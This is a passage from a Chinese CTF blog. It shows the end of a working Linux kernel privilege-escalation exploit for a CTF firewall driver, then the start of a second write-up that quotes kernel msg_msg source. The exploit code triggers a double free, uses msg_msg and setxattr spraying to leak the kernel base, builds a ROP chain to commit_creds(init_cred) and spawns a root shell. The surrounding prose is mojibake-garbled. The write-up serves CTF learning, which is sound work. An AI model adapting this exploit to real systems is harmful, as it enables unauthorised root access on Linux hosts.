class="number">0xffffffff81019d8b</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret=<span class="number">0xffffffff8102af06</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_cred=<span class="number">0xffffffff8106f870</span>;</span><br><span class="line"><span class="keyword">size_t</span> kpti_addr=<span class="number">0xffffffff81600df0</span>+<span class="number">0x10</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret=<span class="number">0xffffffff810001dc</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;31m %s\e[0m\n&quot;</span>,err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%d.%d.%d.%d\n&quot;,(ip&amp;0xff),(ip&amp;0x0000ff00)&gt;&gt;8,(ip&amp;0x00ff0000)&gt;&gt;16,(ip&amp;0xff000000)&gt;&gt;24);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="comment">// if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//     err_exit(&quot;add fail&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    user_msg *msg=(user_msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        add_rule(fd,i,INBOUND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x64</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x65</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1008</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] doublefree\n&quot;</span>);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,OUTBOUND);</span><br><span class="line">    msg_header *fake_msg_header=(msg_header *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_msg_header-&gt;ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1050</span>;</span><br><span class="line">    fake_msg_header-&gt;next=page_msg<span class="number">-0x10</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1050</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;cccccccccccccccc&quot;</span>,<span class="number">0x10</span>))&#123;</span><br><span class="line">            target_obj=re_buf[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m target_obj_addr:%p \e[0m\n&quot;</span>,target_obj);</span><br><span class="line"></span><br><span class="line">    fake_msg_header-&gt;ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header-&gt;next=target_obj;</span><br><span class="line">    fake_msg_header-&gt;security=<span class="number">0</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">2</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1008</span>,<span class="number">4</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">3</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">1</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> seq_operation[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    add_rsp_0x108_pop_3=add_rsp_0x108_pop_3-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    pop_rdi_ret=pop_rdi_ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    commit_cred=commit_cred-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    kpti_addr=kpti_addr-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    ret=ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line"></span><br><span class="line">    seq_operation[<span class="number">0</span>]=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;seq&quot;</span>, seq_operation, <span class="number">0x20</span>, <span class="number">0</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,  kpti_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,  0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ„ä¹‰"><a href="#æ„ä¹‰" class="headerlink" title="æ„ä¹‰"></a>æ„ä¹‰</h2><p>äºåˆ©ç”¨çš„æ„ä¹‰å°±æ˜¯å¯ä»¥æœ‰è¿™æ ·çš„é€šè§£äº†ï¼Œä»¥åä½ç‰ˆæœ¬doublefreeå¯ä»¥ä¸€æŠŠæ¢­äº†ï¼Œäºæˆ‘çš„æ„ä¹‰å°±æ˜¯ç»ˆäºä¸æ˜¯çœ‹ç€åˆ«äººwpå¤ç°å‡ºæ¥çš„äº†ï¼Œè€Œæ˜¯è‡ªå·±æŒ‰ç…§è‡ªå·±æ€è·¯å¹¶ä¸”æˆåŠŸææƒçš„å†…æ ¸åˆ©ç”¨ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/" class="post-title-link" itemprop="url">corCTF 2021 Wall Of Perdition&msgç¬¬äºŒå¼¹</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-11-16 21:18:18" itemprop="dateCreated datePublished" datetime="2022-11-16T21:18:18+08:00">2022-11-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-11-17 22:03:57" itemprop="dateModified" datetime="2022-11-17T22:03:57+08:00">2022-11-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>msgåœ¨è®¸å¤šå†…æ ¸cveä¸­éƒ½æœ‰ä½¿ç”¨ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™é“é¢˜å†åŠ æ·±ä¸€ä¸‹å¯¹msgçš„ç†è§£ï¼Œç„¶åçœ‹çœ‹èƒ½ä¸èƒ½å¤ç°ä¸ªå†…æ ¸cveã€‚</p>
<p>è¿™ä¸ªæ˜¯corctf2021å†…æ ¸é¢˜çš„å›°éš¾æ¨¡å¼ï¼Œç®€å•æ¨¡å¼æ˜¯0x1000çš„objectåˆ©ç”¨ï¼Œå›°éš¾æ¨¡å¼æ˜¯0x40çš„objectåˆ©ç”¨ã€‚æ¯”ä¹‹0x1000çš„åˆ©ç”¨ç¡®å®éº»çƒ¦å¾ˆå¤šï¼Œåœ¨0x1000çš„objectåˆ©ç”¨ä¸­ï¼Œå¦‚æœæ§åˆ¶äº†msgçš„å‰0x28ä¸ªå­—èŠ‚çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨msgçš„<code>m_ts</code>å’Œ<code>next</code>å®Œæˆå†…æ ¸åœ°å€çš„æ³„éœ²ä»¥åŠé…åˆ<code>userfault</code>çš„ä»»æ„åœ°å€å†™ã€‚</p>
<p>åœ¨0x40çš„åˆ©ç”¨ä¸­ï¼Œæ³„éœ²åœ°å€å’Œ0x1000å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œä¸»è¦çš„å·®åˆ«å‡ºç°åœ¨äº†ä»»æ„åœ°å€å†™ä¸Šé¢,å…¶ä¸­åˆ©ç”¨msgè¿›è¡Œä»»æ„åœ°å€å†™çš„å†…æ ¸ä»£ç å¦‚ä¸‹,å°±ç®—èƒ½å¤Ÿä¿®æ”¹msg.next,ä½†æ˜¯å†™çš„é•¿åº¦æ—©å·²ç»è¢«è®°å½•åˆ°äº†lenå˜é‡ä¸­ï¼Œæ‰€ä»¥å‘nextå†™å€¼çš„æ—¶å€™ç›¸å½“äºæ‰§è¡Œäº†<code>copy_from_user(seg + 1, src, 0)</code>,å°±æ²¡æœ‰å‘nextä¸­å†™å€¼ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è¿™é“é¢˜ç›®çš„ä½œè€…çš„ç ”ç©¶ï¼Œä¾æ—§å‘ç°äº†ä¸€ä¸ªåªåˆ©ç”¨msgè¿›è¡Œä»»æ„å†™çš„æ€è·¯ï¼Œçœ‹å®Œåä¸å¾—ä¸è¯´ä¸€å¥å¥½ç‰›ğŸ˜»ã€‚</p>
